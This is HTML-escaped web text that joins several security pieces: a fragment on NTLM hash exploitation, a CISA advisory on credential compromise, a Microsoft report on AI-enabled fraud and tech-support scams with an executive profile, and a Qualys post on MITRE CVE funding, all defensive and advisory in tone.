&lt;p&gt;This rapid exploitation highlights the critical need for organizations to apply patches immediately and ensure that &lt;strong&gt;NTLM vulnerabilities&lt;/strong&gt; are addressed in their environments. The minimal user interaction required for the exploit to trigger and the ease with which attackers can gain access to &lt;strong&gt;NTLM hashes&lt;/strong&gt; make it a significant threat, especially when such hashes can be used in &lt;strong&gt;pass-the-hash&lt;/strong&gt; attacks. With the ongoing evolution of these attack vectors, staying ahead of the threat requires a proactive approach to both &lt;strong&gt;patch management&lt;/strong&gt; and &lt;strong&gt;network security&lt;/strong&gt;, as attackers continually adapt to find new ways to exploit weaknesses.&lt;/p&gt;

While the scope and impact remains unconfirmed, the nature of the reported activity presents potential risk to organizations and individuals, particularly where credential material may be exposed, reused across separate, unaffiliated systems, or embedded (i.e., hardcoded into scripts, applications, infrastructure templates, or automation tools). When credential material is embedded, it is difficult to discover and can enable long-term unauthorized access if exposed.&lt;/p&gt;
&lt;p&gt;The compromise of credential material, including usernames, emails, passwords, authentication tokens, and encryption keys, can pose significant risk to enterprise environments. Threat actors routinely harvest and weaponize such credentials to:&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Escalate privileges and move laterally within networks.&lt;/li&gt;
&lt;li&gt;Access cloud and identity management systems.&lt;/li&gt;
&lt;li&gt;Conduct phishing, credential-based, or business email compromise (BEC) campaigns. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;Resell or exchange access to stolen credentials on criminal marketplaces.&lt;/li&gt;
&lt;li&gt;Enrich stolen data with prior breach information for resale and/or targeted intrusion.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;CISA recommends the following actions to reduce the risks associated with potential credential compromise:&amp;nbsp;&lt;/p&gt;


&lt;ul&gt;
&lt;li&gt;For Organizations:
&lt;ul&gt;
&lt;li&gt;Reset passwords for any known affected users across enterprise services, particularly where local credentials may not be federated through enterprise identity solutions. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;Review source code, infrastructure-as-code templates, automation scripts, and configuration files for hardcoded or embedded credentials and replace them with secure authentication methods supported by centralized secret management.&lt;/li&gt;
&lt;li&gt;Monitor authentication logs for anomalous activity, especially involving privileged, service, or federated identity accounts, and assess whether additional credentials (such as API keys and shared accounts) may be associated with any known impacted identities.&lt;/li&gt;
&lt;li&gt;Enforce phishing-resistant multi-factor authentication (MFA) for all user and administrator accounts wherever technically feasible.&lt;/li&gt;
&lt;li&gt;For additional information for or on Cloud security best practices please review the following Cybersecurity Information Sheets: &lt;a class="Hyperlink SCXW266756557 BCX8" href="https://www.cisa.gov/news-events/alerts/2024/03/07/cisa-and-nsa-release-cybersecurity-information-sheets-cloud-security-best-practices" rel="noreferrer noopener" target="_blank" title="CISA and NSA Release Cybersecurity Information Sheets on Cloud Security Best Practices"&gt;CISA and NSA Release Cybersecurity Information Sheets on Cloud Security Best Practices&lt;/a&gt;. &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;For Users:
&lt;ul&gt;
&lt;li&gt;Immediately update any potentially affected passwords that may have been reused across other platforms or services.&lt;/li&gt;
&lt;li&gt;Use strong, unique passwords for each account and enable phishing-resistant multifactor authentication (MFA) on services and applications that support it. For more information on using strong passwords, see CISA’s &lt;a href="https://www.cisa.gov/secure-our-world/use-strong-passwords" target="_blank" title="Use Strong Passwords"&gt;Use Strong Passwords&lt;/a&gt; web page. For more information on phishing-resistant MFA see CISA’s &lt;a href="https://www.cisa.gov/sites/default/files/2023-01/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf" target="_blank" title="Implementing Phishing-Resistant MFA"&gt;Implementing Phishing-Resistant MFA&lt;/a&gt; Fact Sheet.&lt;/li&gt;
&lt;li&gt;Remain alert against phishing attempts (e.g., referencing login issues, password resets, or suspicious activity notifications) and reference &lt;a href="https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one" target="_blank" title="Phishing Guidance: Stopping the Attack Cycle at Phase One"&gt;Phishing Guidance: Stopping the Attack Cycle at Phase One&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class="wp-block-image size-large" id="threat-briefing"&gt;&lt;img alt="" class="wp-image-138411 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/MSFT_CyberSignals_9thEdition_Title2-1024x107.webp" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="the-evolution-of-ai-enhanced-cyber-scams"&gt;The evolution of AI-enhanced cyber scams&lt;/h2&gt;



&lt;p&gt;AI has started to lower the technical bar for fraud and cybercrime actors looking for their own productivity tools, making it easier and cheaper to generate believable content for cyberattacks at an increasingly rapid rate. AI software used in fraud attempts runs the gamut, from legitimate apps misused for malicious purposes to more fraud-oriented tools used by bad actors in the cybercrime underground.&lt;/p&gt;



&lt;p&gt;AI tools can scan and scrape the web for company information, helping cyberattackers build detailed profiles of employees or other targets to create highly convincing social engineering lures. In some cases, bad actors are luring victims into increasingly complex fraud schemes using fake AI-enhanced product reviews and AI-generated storefronts, where scammers create entire websites and e-commerce brands, complete with fake business histories and customer testimonials. By using deepfakes, voice cloning, phishing emails, and authentic-looking fake websites, threat actors seek to appear legitimate at wider scale.&lt;/p&gt;



&lt;p&gt;According to the Microsoft Anti-Fraud Team, AI-powered fraud attacks are happening globally, with much of the activity coming from China and Europe, specifically Germany due in part to Germany’s status as one of the largest e-commerce and online services markets in the European Union (EU). The larger a digital marketplace in any region, the more likely a proportional degree of attempted fraud will take place.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="e-commerce-fraud"&gt;E-commerce fraud&lt;/h3&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="A shopping cart full of boxes" class="wp-image-138432 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/CYBER_Cart-Final-1024x576.webp" /&gt;&lt;/figure&gt;



&lt;p&gt;Fraudulent e-commerce websites can be set up in minutes using AI and other tools requiring minimal technical knowledge. Previously, it would take threat actors days or weeks to stand up convincing websites. These fraudulent websites often mimic legitimate sites, making it challenging for consumers to identify them as fake.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Using AI-generated product descriptions, images, and customer reviews, customers are duped into believing they are interacting with a genuine merchant, exploiting consumer trust in familiar brands.&lt;/p&gt;



&lt;p&gt;AI-powered customer service chatbots add another layer of deception by convincingly interacting with customers. These bots can delay chargebacks by stalling customers with scripted excuses and manipulating complaints with AI-generated responses that make scam sites appear professional.&lt;/p&gt;



&lt;p&gt;In a multipronged approach, Microsoft has implemented robust defenses across our products and services to protect customers from AI-powered fraud. &lt;a href="https://www.microsoft.com/security/business/cloud-security/microsoft-defender-cloud"&gt;Microsoft Defender for Cloud&lt;/a&gt; provides comprehensive threat protection for Azure resources, including vulnerability assessments and threat detection for virtual machines, container images, and endpoints.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/edge"&gt;Microsoft Edge&lt;/a&gt; features website typo protection and domain impersonation protection using deep learning technology to help users avoid fraudulent websites. Edge has also implemented a machine learning-based &lt;a href="https://www.microsoft.com/edge/features/scareware-blocker?form=MA13FJ"&gt;Scareware Blocker&lt;/a&gt; to identify and block potential scam pages and deceptive pop-up screens with alarming warnings claiming a computer has been compromised. These attacks try to frighten users into calling fraudulent support numbers or downloading harmful software.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="job-and-employment-fraud"&gt;Job and employment fraud&lt;/h3&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="A hand holding a piece of paper with numbers and a picture of a person" class="wp-image-138433 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/CYBER_Resume_Final-1024x576.webp" /&gt;&lt;/figure&gt;



&lt;p&gt;The rapid advancement of generative AI has made it easier for scammers to create fake listings on various job platforms. They generate fake profiles with stolen credentials, fake job postings with auto-generated descriptions, and AI-powered email campaigns to phish job seekers. AI-powered interviews and automated emails enhance the credibility of job scams, making it harder for job seekers to identify fraudulent offers.&lt;/p&gt;



&lt;p&gt;To prevent this, job platforms should introduce multifactor authentication for employer accounts to make it harder for bad actors to take over legitimate hirers’ listings and use available fraud-detection technologies to catch suspicious content.&lt;/p&gt;



&lt;p&gt;Fraudsters often ask for personal information, such as resumes or even bank account details, under the guise of verifying the applicant&amp;#8217;s information. Unsolicited text and email messages offering employment opportunities that promise high pay for minimal qualifications are typically an indicator of fraud.&lt;/p&gt;



&lt;p&gt;Employment offers that include requests for payment, offers that seem too good to be true, unsolicited offers or interview requests over text message, and a lack of formal communication platforms can all be indicators of fraud.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="tech-support-scams"&gt;Tech support scams&lt;/h3&gt;



&lt;p&gt;Tech support scams are a type of fraud where scammers trick victims into unnecessary technical support services to fix a device or software problems that don&amp;#8217;t exist. The scammers may then gain remote access to a computer—which lets them access all information stored on it, and on any network connected to it or install malware that gives them access to the computer and sensitive data.&lt;/p&gt;



&lt;p&gt;Tech support scams are a case where elevated fraud risks exist, even if AI does not play a role. For example, in mid-April 2024, Microsoft Threat Intelligence observed the financially motivated and ransomware-focused cybercriminal group &lt;a href="https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/?msockid=1231134988d36d8c265406c2893d6c90" rel="noreferrer noopener" target="_blank"&gt;Storm-1811&lt;/a&gt; abusing &lt;a href="https://support.microsoft.com/en-us/windows/solve-pc-problems-remotely-using-quick-assist-b077e31a-16f4-2529-1a47-21f6a9040bf3" rel="noreferrer noopener" target="_blank"&gt;Windows Quick Assist&lt;/a&gt; software by posing as IT support. Microsoft did not observe AI used in these attacks; Storm-1811 instead impersonated legitimate organizations through voice phishing (&lt;a href="https://www.microsoft.com/en-us/microsoft-365-life-hacks/privacy-and-safety/what-is-a-vishing-attack" rel="noreferrer noopener" target="_blank"&gt;vishing&lt;/a&gt;) as a form of social engineering, convincing victims to grant them device access through Quick Assist.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Quick Assist is a tool that enables users to share their Windows or macOS device with another person over a remote connection. Tech support scammers often pretend to be legitimate IT support from well-known companies and use social engineering tactics to gain the trust of their targets. They then attempt to employ tools like Quick Assist to connect to the target’s device.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Quick Assist and Microsoft are not compromised in these cyberattack scenarios; however, the abuse of legitimate software presents risk Microsoft is focused on mitigating. Informed by Microsoft’s understanding of evolving cyberattack techniques, the company’s anti-fraud and product teams work closely together to improve transparency for users and enhance fraud detection techniques.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The Storm-1811 cyberattacks highlight the capability of social engineering to circumvent security defenses. Social engineering involves collecting relevant information about targeted victims and arranging it into credible lures delivered through phone, email, text, or other mediums. Various AI tools can quickly find, organize, and generate information, thus acting as productivity tools for cyberattackers. Although AI is a new development, enduring measures to counter social engineering attacks remain highly effective. These include increasing employee awareness of legitimate helpdesk contact and support procedures, and applying &lt;a href="https://www.microsoft.com/en-us/security/business/security-101/what-is-zero-trust-architecture" rel="noreferrer noopener" target="_blank"&gt;Zero Trust&lt;/a&gt; principles to enforce least privilege across employee accounts and devices, thereby limiting the impact of any compromised assets while they are being addressed.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Microsoft has taken action to mitigate attacks by Storm-1811 and other groups by suspending identified accounts and tenants associated with inauthentic behavior. If you receive an unsolicited tech support offer, it is likely a scam. Always reach out to trusted sources for tech support. If scammers claim to be from Microsoft, we encourage you to report it directly to us at &lt;a href="https://www.microsoft.com/reportascam" rel="noreferrer noopener" target="_blank"&gt;https://www.microsoft.com/reportascam&lt;/a&gt;.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Building on the &lt;a href="https://www.microsoft.com/en-us/trust-center/security/secure-future-initiative" rel="noreferrer noopener" target="_blank"&gt;Secure Future Initiative (SFI)&lt;/a&gt;, Microsoft is taking a proactive approach to ensuring our products and services are “Fraud-resistant by Design.” In January 2025, a new fraud prevention policy was introduced: Microsoft product teams must now perform fraud prevention assessments and implement fraud controls as part of their design process.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="recommendations"&gt;Recommendations&lt;/h3&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Strengthen employer authentication&lt;/strong&gt;:&lt;strong&gt; &lt;/strong&gt;Fraudsters often hijack legitimate company profiles or create fake recruiters to deceive job seekers. To prevent this, job platforms should introduce multifactor authentication and Verified ID as part of Microsoft Entra ID for employer accounts, making it harder for unauthorized users to gain control.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Monitor for AI-based recruitment scams&lt;/strong&gt;: Companies should deploy deepfake detection algorithms to identify AI-generated interviews where facial expressions and speech patterns may not align naturally.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Be cautious of websites and job listings that seem too good to be true&lt;/strong&gt;:&lt;strong&gt; &lt;/strong&gt;Verify the legitimacy of websites by checking for secure connections (https) and using tools like Microsoft Edge’s typo protection.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Avoid providing personal information or payment details to unverified sources&lt;/strong&gt;: Look for red flags in job listings, such as requests for payment or communication through informal platforms like text messages, WhatsApp, nonbusiness Gmail accounts, or requests to contact someone on a personal device for more information.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="wp-block-image size-large" id="defending-against-attacks"&gt;&lt;img alt="A white text on a black background" class="wp-image-138412 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/MSFT_CyberSignals_9thEdition_Title4-1024x107.webp" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="using-microsoft-s-security-signal-to-combat-fraud"&gt;Using Microsoft’s security signal to combat fraud&lt;/h2&gt;



&lt;p&gt;Microsoft is actively working to stop fraud attempts using AI and other technologies by evolving large-scale detection models based on AI, such as machine learning, to play defense by learning from and mitigating fraud attempts. Machine learning is the process that helps a computer learn without direct instruction using algorithms to discover patterns in large datasets. Those patterns are then used to create a comprehensive AI model, allowing for predictions with high accuracy.&lt;/p&gt;



&lt;p&gt;We have developed in-product safety controls that warn users about potential malicious activity and integrate rapid detection and prevention of new types of attacks.&lt;/p&gt;



&lt;p&gt;Our fraud team has developed &lt;a href="https://learn.microsoft.com/en-us/defender-office-365/anti-phishing-policies-about" rel="noreferrer noopener" target="_blank"&gt;domain impersonation protection&lt;/a&gt; using deep-learning technology at the domain creation stage, to help protect against fraudulent e-commerce websites and fake job listings. Microsoft Edge has incorporated website typo protection, and we have developed AI-powered fake job detection systems for LinkedIn.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/edge/features/microsoft-defender-smartscreen"&gt;Microsoft Defender Smartscreen&lt;/a&gt; is a cloud-based security feature that aims to prevent unsafe browsing habits by analyzing websites, files, and applications based on their reputation and behavior. It is integrated into Windows and the Edge browser to help protect users from phishing attacks, malicious websites, and potentially harmful downloads.&lt;/p&gt;



&lt;p&gt;Furthermore,&amp;nbsp;&lt;a href="https://news.microsoft.com/on-the-issues/2022/05/03/how-microsofts-digital-crimes-unit-fights-cybercrime/?msockid=356b7a12f0156be706e16f23f1386a52" rel="noreferrer noopener" target="_blank"&gt;Microsoft&amp;#8217;s Digital Crimes Unit&lt;/a&gt;&amp;nbsp;(DCU) partners with others in the&amp;nbsp;&lt;a href="https://blogs.microsoft.com/on-the-issues/2023/10/19/microsoft-amazon-tech-support-fraud-india/" rel="noreferrer noopener" target="_blank"&gt;private&amp;nbsp;and public sector&lt;/a&gt;&amp;nbsp;to disrupt the malicious infrastructure used by criminals perpetuating cyber-enabled fraud. The team’s longstanding collaboration with law enforcement around the world to respond to tech support fraud has resulted in hundreds of arrests and increasingly severe prison sentences worldwide. The DCU is applying key learnings from past actions to&amp;nbsp;&lt;a href="https://blogs.microsoft.com/on-the-issues/2025/02/27/disrupting-cybercrime-abusing-gen-ai/" rel="noreferrer noopener" target="_blank"&gt;disrupt those who seek to&amp;nbsp;abuse generative&amp;nbsp;AI&amp;nbsp;technology&lt;/a&gt;&amp;nbsp;for&amp;nbsp;malicious or&amp;nbsp;fraudulent purposes.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="quick-assist-features-and-remote-help-combat-tech-support-fraud"&gt;Quick Assist features and remote help combat tech support fraud&lt;/h3&gt;



&lt;p&gt;To help combat tech support fraud, we have incorporated warning messages to alert users about possible tech support scams in Quick Assist before they grant access to someone approaching them purporting to be an authorized IT department or other support resource.&lt;/p&gt;



&lt;p&gt;Windows users must read and click the box to acknowledge the security risk of granting remote access to the device.&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="A man talking on a phone and a laptop with a white bubble" class="wp-image-138423 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/CYBER_IT_Final-1024x576.webp" /&gt;&lt;/figure&gt;



&lt;p&gt;Microsoft has significantly enhanced Quick Assist protection for Windows users by leveraging its security signal. In response to tech support scams and other threats, Microsoft now blocks an average of 4,415 suspicious Quick Assist connection attempts daily, accounting for approximately 5.46% of global connection attempts. These blocks target connections exhibiting suspicious attributes, such as associations with malicious actors or unverified connections.&lt;/p&gt;



&lt;p&gt;Microsoft&amp;#8217;s continual focus on advancing Quick Assist safeguards seeks to counter adaptive cybercriminals, who previously targeted individuals opportunistically with fraudulent connection attempts, but more recently have sought to target enterprises with more organized cybercrime campaigns that Microsoft&amp;#8217;s actions have helped disrupt.&lt;/p&gt;



&lt;p&gt;Our &lt;strong&gt;Digital Fingerprinting &lt;/strong&gt;capability, which leverages AI and machine learning, drives these safeguards by providing fraud and risk signals to detect fraudulent activity. If our risk signals detect a possible scam, the Quick Assist session is automatically ended. Digital Fingerprinting works by collecting various signals to detect and prevent fraud.&lt;/p&gt;



&lt;p&gt;For enterprises combating tech support fraud, &lt;a href="https://learn.microsoft.com/en-us/mem/intune-service/fundamentals/remote-help"&gt;Remote Help&lt;/a&gt; is another valuable resource for employees. Remote Help is designed for internal use within an organization and includes features that make it ideal for enterprises.&lt;/p&gt;



&lt;p&gt;By reducing scams and fraud, Microsoft aims to enhance the overall security of its products and protect its users from malicious activities.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="consumer-protection-tips"&gt;Consumer protection tips&lt;/h3&gt;



&lt;p&gt;Fraudsters exploit psychological triggers such as urgency, scarcity, and trust in social proof. Consumers should be cautious of:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Impulse buying&lt;/strong&gt;—Scammers create a sense of urgency with “limited-time” deals and countdown timers.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Trusting fake social proof&lt;/strong&gt;—AI generates fake reviews, influencer endorsements, and testimonials to appear legitimate.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Clicking on ads without verification&lt;/strong&gt;—Many scam sites spread through AI-optimized social media ads. Consumers should cross-check domain names and reviews before purchasing.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Ignoring payment security&lt;/strong&gt;—Avoid direct bank transfers or cryptocurrency payments, which lack fraud protections.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Job seekers should verify employer legitimacy, be on the lookout for common job scam red flags, and avoid sharing personal or financial information with unverified employers.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Verify employer legitimacy&lt;/strong&gt;—Cross-check company details on LinkedIn, Glassdoor, and official websites to verify legitimacy.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Notice common job scam red flags&lt;/strong&gt;—If a job requires upfront payments for training materials, certifications, or background checks, it is likely a scam. Unrealistic salaries or no-experience-required remote positions should be approached with skepticism. Emails from free domains (such as &lt;em&gt;johndoehr@gmail.com&lt;/em&gt; instead of &lt;em&gt;hr@company.com&lt;/em&gt;) are also typically indicators of fraudulent activity.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Be cautious of AI-generated interviews and communications&lt;/strong&gt;—If a video interview seems unnatural, with lip-syncing delays, robotic speech, or odd facial expressions, it could be deepfake technology at work. Job seekers should always verify recruiter credentials through the company’s official website before engaging in any further discussions.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Avoid sharing personal or financial information&lt;/strong&gt;—Under no circumstances should you provide a Social Security number, banking details, or passwords to an unverified employer.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Microsoft is also a member of the &lt;a href="https://www.gasa.org/membership" rel="noreferrer noopener" target="_blank"&gt;Global Anti-Scam Alliance&lt;/a&gt; (GASA), which aims to bring governments, law enforcement, consumer protection organizations, financial authorities and providers, brand protection agencies, social media, internet service providers, and cybersecurity companies together to share knowledge and protect consumers from getting scammed.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="recommendations-1"&gt;Recommendations&lt;/h3&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Remote Help:&lt;/strong&gt; Microsoft recommends using Remote Help instead of Quick Assist for internal tech support. Remote Help is designed for internal use within an organization and&amp;nbsp;incorporates several features designed to enhance security and minimize the risk of tech support hacks. It is engineered to be used only within an organization&amp;#8217;s tenant, providing a safer alternative to Quick Assist.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Digital Fingerprinting:&lt;/strong&gt; This identifies malicious behaviors and ties them back to specific individuals. This helps in monitoring and preventing unauthorized access.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Blocking full control requests:&lt;/strong&gt; Quick Assist now includes warnings and requires users to check a box acknowledging the security implications of sharing their screen. This adds a layer of helpful “security friction” by prompting users who may be multitasking or preoccupied to pause to complete an authorization step.&lt;/li&gt;
&lt;/ul&gt;


&lt;figure class="wp-block-image size-large" id="expert-profile"&gt;&lt;img alt="A black background with orange dots" class="wp-image-138413 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/MSFT_CyberSignals_9thEdition_Title3-1024x107.webp" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="kelly-bissell-a-cybersecurity-pioneer-combating-fraud-in-the-new-era-of-ai"&gt;Kelly Bissell: A cybersecurity pioneer combating fraud in the new era of AI&lt;/h2&gt;



&lt;p&gt;Kelly Bissell’s journey into cybersecurity began unexpectedly in 1990. Initially working in computer science, Kelly was involved in building software for healthcare patient accounting and operating systems at Medaphis and Bellsouth, now AT&amp;amp;T.&lt;/p&gt;



&lt;p&gt;His interest in cybersecurity was sparked when he noticed someone logged into a phone switch attempting to get free long-distance calls and traced the intruder back to Romania. This incident marked the beginning of Kelly’s career in cybersecurity.&lt;/p&gt;



&lt;p&gt;“I stayed in cybersecurity hunting for bad actors, integrating security controls for hundreds of companies, and helping shape the NIST security frameworks and regulations such as FFIEC, PCI, NERC-CIP,” he explains.&lt;/p&gt;



&lt;p&gt;Currently, Kelly is Corporate Vice President of Anti-Fraud and Product Abuse within Microsoft Security. Microsoft’s fraud team employs machine learning and AI to build better detection code and understand fraud operations. They use AI-powered solutions to detect and prevent cyberthreats, leveraging advanced fraud detection frameworks that continuously learn and evolve.&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&amp;#8220;Cybercrime is a trillion-dollar problem, and it’s been going up every year for the past 30 years. I think we have an opportunity today to adopt AI faster so we can detect and close the gap of exposure quickly. Now we have AI that can make a difference at scale and help us build security and fraud protections into our products much faster.&amp;#8221;&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;Previously Kelly managed the Microsoft Detection and Response Team (DART) and created the Global Hunting, Oversight, and Strategic Triage (GHOST) team that detected and responded to attackers such as &lt;a href="https://www.microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/?msockid=1231134988d36d8c265406c2893d6c90"&gt;Storm-0558&lt;/a&gt; and &lt;a href="https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/?msockid=1231134988d36d8c265406c2893d6c90"&gt;Midnight Blizzard&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Prior to Microsoft, during his time at Accenture and Deloitte, Kelly collaborated with companies and worked extensively with government agencies like the Department of Homeland Security’s Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation, where he helped build security systems inside their operations.&lt;/p&gt;



&lt;p&gt;His time as Chief Information Security Officer (CISO) at a bank exposed him to addressing both cybersecurity and fraud, leading to his involvement in shaping regulatory guidelines to protect banks and eventually Microsoft.&lt;/p&gt;



&lt;p&gt;Kelly has also played a significant role in shaping regulations around the National Institute of Standards and Technology (NIST) and Payment Card Industry (PCI) compliance, which helps ensure the security of businesses’ credit card transactions, among others.&lt;/p&gt;



&lt;p&gt;Internationally, Kelly played a crucial role in helping establish agencies and improve cybersecurity measures. As a consultant in London, he helped stand up the United Kingdom’s National Cyber Security Centre (NCSC), which is part of the Government Communications Headquarters (GCHQ), the equivalent of CISA. Kelly’s efforts in content moderation with several social media companies, including YouTube, were instrumental in removing harmful content.&lt;/p&gt;



&lt;p&gt;That’s why he’s excited about Microsoft’s partnership with &lt;a href="https://www.gasa.org/" rel="noreferrer noopener" target="_blank"&gt;GASA&lt;/a&gt;. GASA brings together governments, law enforcement, consumer protection organizations, financial authorities, internet service providers, cybersecurity companies, and others to share knowledge and define joint actions to protect consumers from getting scammed.&lt;/p&gt;



&lt;p&gt;“If I protect Microsoft, that’s good, but it’s not sufficient. In the same way, if Apple does their thing, and Google does their thing, but if we’re not working together, we’ve all missed the bigger opportunity. We must share cybercrime information with each other and educate the public. If we can have a three-pronged approach of tech companies building security and fraud protection into their products, public awareness, and sharing cybercrime and fraudster information with law enforcement, I think we can make a big difference,” he says.&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="A quote from Kelly Bissell that says &amp;quot;I think we have an opportunity today to adopt AI faster so we can detect and close the gap of exposure quickly.&amp;quot;" class="wp-image-138435 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/CYBER_Profile_Export-1024x576.webp" /&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;Methodology:&lt;/strong&gt; Microsoft platforms and services, including Azure, Microsoft Defender for Office, Microsoft Threat Intelligence, and Microsoft Digital Crimes Unit (DCU), provided anonymized data on threat actor activity and trends. Additionally, Microsoft Entra ID provided anonymized data on threat activity, such as malicious email accounts, phishing emails, and attacker movement within networks. Additional insights are from the daily security signals gained across Microsoft, including the cloud, endpoints, the intelligent edge, and telemetry from Microsoft platforms and services. The $4 billion figure represents an aggregated total of fraud and scam attempts against Microsoft and our customers in consumer and enterprise segments (in 12 months).&lt;/p&gt;

&lt;p&gt;The MITRE CVE program has been an essential part of cybersecurity for over 25 years. It provides a consistent and standardized way to identify and track vulnerabilities and exposures in software and systems. It serves as a central hub, providing a key database that countless organizations depend on for critical vulnerability information. However, with the possibility of its funding running out, there are growing concerns about the program&amp;#8217;s future and its ability to continue supporting the cybersecurity community.&lt;/p&gt;



&lt;p&gt;In addition, the &lt;a href="https://www.nist.gov/itl/nvd"&gt;National Institute of Standards and Technology (NIST) announced&lt;/a&gt; they would categorize vulnerabilities with a publish date prior to January 1, 2018, as “Deferred.” That status means that they will not add enrichment data to them. However, simply because a vulnerability is older does not necessarily mean that it is low risk. For organizations that rely on NIST’s CVSS scores and the enrichment data from NIST to prioritize their remediation, this is a major concern.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Even with the NIST status change and if MITRE should face challenges,&lt;/strong&gt; &lt;strong&gt;Qualys, backed by 120+ white&lt;/strong&gt;&lt;strong&gt;‑hat researchers and more than 25 threat&lt;/strong&gt;&lt;strong&gt;‑intelligence feeds, builds detections directly from vendor advisories—not solely relying on MITRE. As a result, customers experience zero delay or degradation in signature quality.&lt;/strong&gt;&lt;/p&gt;



&lt;span id="more-37590"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="committed-to-helping-the-cybersecurity-community"&gt;&lt;strong&gt;Committed to Helping the Cybersecurity Community&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;These public databases offer the cybersecurity community a common language for risk and an unprecedented level of cohesiveness and clarity. As such, they have been invaluable in helping everyone maintain higher levels of security. We believe in the power of these entities and their great work. That is why Qualys is committed to supporting MITRE and the wider security community, and we are actively collaborating with industry partners to identify and pursue sustainable funding options that will help maintain MITRE’s vital work.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-does-qualys-vulnerability-coverage-and-risk-based-prioritization-keep-you-covered"&gt;&lt;strong&gt;How Does Qualys&amp;#8217; Vulnerability Coverage and Risk-Based Prioritization Keep You Covered?&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;As noted above, even with the recent developments, Qualys customers will not experience any impact. Here’s why:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Multiple independent data sources: &lt;/strong&gt;We already base detections on vendor and CNA advisories, CERT bulletins, opensource security feeds, and our own research—not CVE.org.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Fallback identifiers:&lt;/strong&gt; Where a third-party CNA can’t publish a CVE, we ingest their advisory anyway and map it to a QID, then auto-reconcile the moment an official CVE appears.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;QIDs continue to flow&lt;/strong&gt;—new detections are added using an official CVE or a temporary placeholder. Once CVE.org or its alternative is back online, all IDs and metadata are automatically normalized, and no action from Qualys customers is required.&lt;/p&gt;



